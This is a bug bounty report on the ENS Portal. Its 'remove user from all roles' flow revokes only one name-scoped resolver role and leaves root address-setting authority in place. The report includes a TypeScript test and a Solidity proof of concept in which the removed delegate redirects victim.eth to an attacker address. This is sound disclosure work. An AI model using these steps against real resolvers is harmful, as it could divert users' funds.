# 89387 w a critical remove user from all roles leaves root resolver authority active enabling ens address redirection

**Submitted on Aug 19th 2026 at 00:18:07 UTC by @Avicoh for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89387
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief / Intro

The Portal confirms **"Remove user from all roles"** but, when one account has both root-wide and name-scoped resolver roles, it constructs a transaction that revokes only one name-scoped resource. The transaction succeeds while the account's root authority remains active. A supposedly removed delegate retaining root `ROLE_SET_ADDR` can then change address records for every name using that resolver and redirect ENS resolution to an attacker-controlled address.

## Vulnerability Details

Resolver permissions are scoped by both `account` and EAC `resource` (root, one name, another name). The Portal loses that distinction:

{% stepper %}
{% step %}

## Grouping loses resource scope

`apps/portal/src/lib/roles/resolverRoles.ts:179-220` groups entries only by lower-cased account. Lines 201-204 append roles and resolved names from every resource into one editable row.
{% endstep %}

{% step %}

## The sidebar selects only one target

`ResolverRolesSidebar.tsx:165-169` receives the merged row and chooses one target:

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

If the row contains root plus any name resource, `roleName` is non-empty and the root scope is discarded.
{% endstep %}

{% step %}

## Removal creates one name-scoped action

`ResolverRolesSidebar.tsx:307-322` creates one remove action using that one name and the union of every role in the merged row.
{% endstep %}

{% step %}

## The UI represents this as complete removal

The UI labels this operation **Remove user** and the confirmation states: **"Are you sure you want to remove this user from all roles?"** The transaction modal does not disclose the selected resource; it says only `Remove user <account>`.
{% endstep %}

{% step %}

## The selected name is forwarded to name-scoped revocation

`prepareResolverRolesIntent.ts:38-46` forwards the single name to `revokeResolverRoles.ts:45-60`. Any non-empty name selects name scope and encodes:

```
authorizeNameRoles(selectedName, mergedRoleBitmap, account, false)
```

It does not call `revokeRootRoles` and does not iterate the other resource entries.
{% endstep %}
{% endstepper %}

The resolver contract behaves correctly and revokes only the supplied resource. Root roles are stored independently and remain effective for record setters. Therefore the Portal transaction succeeds while root authority survives.

Concrete example:

```
Initial delegate permissions:
  root                 -> ROLE_SET_ADDR
  secondary.eth        -> ROLE_SET_TEXT

Portal displays one merged user row:
  scopes               -> (root), secondary.eth
  roles                -> ROLE_SET_ADDR, ROLE_SET_TEXT

Administrator confirms:
  "Remove this user from all roles"

Portal actually encodes:
  authorizeNameRoles(
    dnsEncode("secondary.eth"),
    ROLE_SET_ADDR | ROLE_SET_TEXT,
    delegate,
    false
  )

Result:
  name-scoped ROLE_SET_TEXT is removed
  root ROLE_SET_ADDR remains active
```

## Impact Details

This is a failed security revocation, not a cosmetic or stale-display issue.

* The connected administrator submits a materially different transaction from the one explicitly represented by the Portal: one resource is revoked while root and all other resources are omitted.
* A terminated, compromised, or malicious delegate remains globally authorized after the administrator completes the definitive removal flow.
* Retained root `ROLE_SET_ADDR` allows the removed delegate to replace ETH or other address records for every name using the resolver. Future users can resolve a victim name to the attacker's destination and send funds there.
* Other retained root roles can modify text/contenthash records or clear records across all attached names.

This matches the selected Critical impacts: (1) displaying/constructing an incorrect transaction detail that the user then approves, including ENS resolution to an attacker-controlled address, and (2) malicious interaction with an already-connected wallet through modified/omitted transaction arguments.

No phishing, malicious browser, indexer defect, or smart-contract defect is required. The PermissionedResolver is used only to demonstrate the security consequence of the in-scope Portal's incorrect transaction construction.

## Known-Issue Distinction

Published `QA-01` concerns functional errors after **name transfers** involving certain role combinations. It expressly states that a demonstrated security consequence, such as a role combination granting authority it should not, is a new finding. This report concerns a different code path (`groupRolesByAccount` and `ResolverRolesSidebar`) and proves retained root authority plus a successful post-removal address modification.

## References

* Frozen Portal revision: `cda79acaad59711b943fc68207ebb3f1d0ff8596`
* Upstream frozen revision: `63772fd872af472ced58b009499355f3430c2a86`
* `apps/portal/src/lib/roles/resolverRoles.ts:179-220`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169,307-322,338-344,441-448`
* `apps/portal/src/features/resolver/helpers/prepareResolverRolesIntent.ts:38-46`
* `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60`

## Proof of Concept

### Preconditions

1. A normal PermissionedResolver is controlled by the victim/administrator.
2. The same delegate account has root `ROLE_SET_ADDR` and a name-scoped role such as `ROLE_SET_TEXT` for `secondary.eth`.

This state is reachable through the Portal: the add-user interface offers both `Root (all nodes)` and individual names, and it permits granting the same account at each scope.

### UI and Calldata Reproduction

{% stepper %}
{% step %}

## Open the resolver roles page

Open `/resolver/<resolverAddress>/roles` as the resolver administrator.
{% endstep %}

{% step %}

## Observe the merged delegate row

Observe that the delegate appears as one row containing `(root)` and `secondary.eth`, with the union of both scopes' roles.
{% endstep %}

{% step %}

## Remove the user

Open the row and click **Remove user**.
{% endstep %}

{% step %}

## Confirm the removal dialog

Confirm the dialog stating that the user will be removed **from all roles**.
{% endstep %}

{% step %}

## Decode the generated calldata

It is one name-scoped call:

```
authorizeNameRoles(
  dnsEncode("secondary.eth"),
  ROLE_SET_ADDR | ROLE_SET_TEXT,
  delegate,
  false
)
```

The correct transaction set would include both:

```
revokeRootRoles(ROLE_SET_ADDR, delegate)
authorizeNameRoles(dnsEncode("secondary.eth"), ROLE_SET_TEXT, delegate, false)
```

{% endstep %}

{% step %}

## Submit the Portal-generated transaction

It succeeds.
{% endstep %}

{% step %}

## Check the root role

Read `hasRootRoles(ROLE_SET_ADDR, delegate)`: it remains `true`.
{% endstep %}

{% step %}

## Modify the victim address as the removed delegate

From the supposedly removed delegate, call `setAddr(namehash("victim.eth"), attackerAddress)` on the resolver.
{% endstep %}

{% step %}

## Resolve the victim name

Resolve `victim.eth`; it now returns the attacker address.
{% endstep %}
{% endstepper %}

### Runnable Portal Test Using Production Helpers

Copy the following file to `apps/portal/src/features/resolver/__research_resolver_role_aggregation.test.ts` in frozen revision `cda79acaad59711b943fc68207ebb3f1d0ff8596`:

```ts
import type { ResolverRole } from '@ensdomains/ensjs/public/v2'
import { decodeFunctionData, type Address, type WalletClient } from 'viem'
import { sepolia } from 'viem/chains'
import { prepareResolverRolesIntent } from '@/features/resolver/helpers/prepareResolverRolesIntent'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '@/lib/roles/resolverRoles'

const resolverAddress = '0x1111111111111111111111111111111111111111'
const owner = '0x2222222222222222222222222222222222222222'
const delegate = '0x3333333333333333333333333333333333333333'
const name = 'victim.eth'
const rootResource = `0x${'0'.repeat(64)}`
const walletClient = { account: { address: owner }, chain: sepolia } as WalletClient

describe('resolver role aggregation removal', () => {
  it('turns Remove user from all roles into a one-name revoke', () => {
    const rows = groupRolesByAccount([
      { account: delegate, resource: rootResource,
        roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}` },
      { account: delegate, resource: computeNameResource(name),
        roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}` },
    ], buildResourceToNameMap([{ name }]))

    expect(rows).toHaveLength(1)
    expect(rows[0].resolvedNames).toEqual(['(root)', name])
    expect(rows[0].decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])

    // Exact target-selection expression from ResolverRolesSidebar.
    const roleName = rows[0].resolvedNames.find((n) => n !== '(root)') ?? ''
    const intent = prepareResolverRolesIntent({
      type: 'remove', name: roleName, account: delegate as Address,
      roles: rows[0].decodedRoles as ('ROLE_SET_ADDR' | 'ROLE_SET_TEXT')[],
    }, resolverAddress, { walletClient, chainId: sepolia.id })

    expect(intent?.type).toBe('custom')
    if (!intent || intent.type !== 'custom') throw new Error('missing intent')

    const decoded = decodeFunctionData({
      abi: [{ type: 'function', name: 'authorizeNameRoles',
        stateMutability: 'nonpayable', inputs: [
          { name: 'toName', type: 'bytes' },
          { name: 'roleBitmap', type: 'uint256' },
          { name: 'account', type: 'address' },
          { name: 'grant', type: 'bool' },
        ], outputs: [{ name: 'updated', type: 'bool' }] }],
      data: intent.request.data,
    })

    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args?.[0]).toBe('0x0676696374696d0365746800')
    expect(decoded.args?.[1]).toBe(resolverRoles.ROLE_SET_ADDR | resolverRoles.ROLE_SET_TEXT)
    expect(decoded.args?.[2]).toBe(delegate)
    expect(decoded.args?.[3]).toBe(false)
  })
})
```

Run from `apps/portal`:

```bash
pnpm exec vitest run \
  src/features/resolver/__research_resolver_role_aggregation.test.ts \
  src/lib/roles/resolverRoles.test.ts
```

Observed result:

```
Test Files  2 passed (2)
Tests       17 passed (17)
```

Portal test SHA-256:

```
3300a03c4989f448987890c82950e0bbbb8674106ddc8440ccf3558b7859ae98
```

### Exact-Contract Impact Test

The following supporting test uses the exact PermissionedResolver source to prove the surviving root role is usable after the Portal-style transaction:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";

contract ResolverRoleAggregationPoC is Test {
    PermissionedResolver internal resolver;
    address internal owner = makeAddr("owner");
    address internal delegate = makeAddr("delegate");
    address internal attackerDestination = makeAddr("attacker-destination");
    bytes internal victimName;
    bytes internal secondaryName;
    bytes32 internal victimNode;

    function setUp() external {
        VerifiableFactory factory = new VerifiableFactory();
        PermissionedResolver implementation = new PermissionedResolver(address(this));
        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (owner, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
        );
        resolver = PermissionedResolver(factory.deployProxy(
            address(implementation), uint256(keccak256(initData)), initData
        ));
        victimName = NameCoder.encode("victim.eth");
        secondaryName = NameCoder.encode("secondary.eth");
        victimNode = NameCoder.namehash(victimName, 0);
    }

    function test_portalStyleRemoveAllLeavesRootRoleAndDelegateCanStillReplaceAddress() external {
        vm.startPrank(owner);
        resolver.grantRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, delegate);
        resolver.authorizeNameRoles(
            secondaryName, PermissionedResolverLib.ROLE_SET_TEXT, delegate, true
        );

        // Exact effect of the Portal's one-name "remove all" transaction.
        resolver.authorizeNameRoles(
            secondaryName,
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_SET_TEXT,
            delegate,
            false
        );
        vm.stopPrank();

        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, delegate),
            "root role survived the Portal-style remove-all call"
        );

        vm.prank(delegate);
        resolver.setAddr(victimNode, attackerDestination);
        assertEq(resolver.addr(victimNode), attackerDestination,
            "removed delegate still changed victim address");
    }
}
```

Run from the exact contracts tree:

```bash
forge test --match-path test/research/ResolverRoleAggregationPoC.t.sol -vvvv
```

Observed result:

```
1 passed; 0 failed; 0 skipped
```

Exact-contract PoC SHA-256:

```
5bd0ed0cb71eb0941bcc1543d7617df3e4d9705a72f2ef307245e3d29041e682
```

Unmodified resolver regression suite:

```bash
forge test --match-path test/unit/resolver/PermissionedResolver.t.sol -vv
# 69 passed; 0 failed; 0 skipped
```
